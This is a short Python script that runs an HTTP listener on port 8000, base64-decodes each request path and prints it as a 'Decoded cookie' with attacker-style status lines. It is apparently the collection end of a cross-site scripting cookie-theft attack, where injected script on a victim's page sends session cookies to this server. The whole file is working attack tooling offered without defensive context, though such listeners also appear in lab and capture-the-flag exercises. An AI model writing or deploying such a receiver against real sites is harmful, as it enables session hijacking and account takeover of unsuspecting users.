
from http.server import BaseHTTPRequestHandler, HTTPServer
import base64

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        encoded = self.path[1:]  # remove leading "/"

        try:
            decoded = base64.b64decode(encoded).decode()
        except:
            decoded = "Invalid base64"

        print("\n[+] Received request")
        print("[+] Raw path:", self.path)
        print("[+] Decoded cookie:", decoded)

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", 8000), Handler)
    print("[*] Listening on port 8000...")
    server.serve_forever()